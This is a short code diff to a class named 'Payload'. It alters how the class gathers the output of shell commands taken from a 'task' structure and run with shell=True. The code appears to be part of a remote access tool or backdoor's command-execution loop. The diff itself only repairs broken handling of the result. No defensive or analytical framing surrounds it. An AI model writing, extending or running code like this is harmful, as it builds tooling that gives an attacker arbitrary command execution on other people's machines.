@@ -1087,9 +1087,7 @@ class Payload():
                             if command:
                                 result = bytes(command(action) if action else command())
                             else:
-                                result, reserr = bytes().join(subprocess.Popen(task['task'].encode(), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
-                                if result == None and reserr != None:
-                                    result = reserr
+                                result = bytes().join(subprocess.Popen(task['task'].encode(), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                         except Exception as e:
                             result = "{} error: {}".format(self.run.func_name, str(e))
                             log(result)
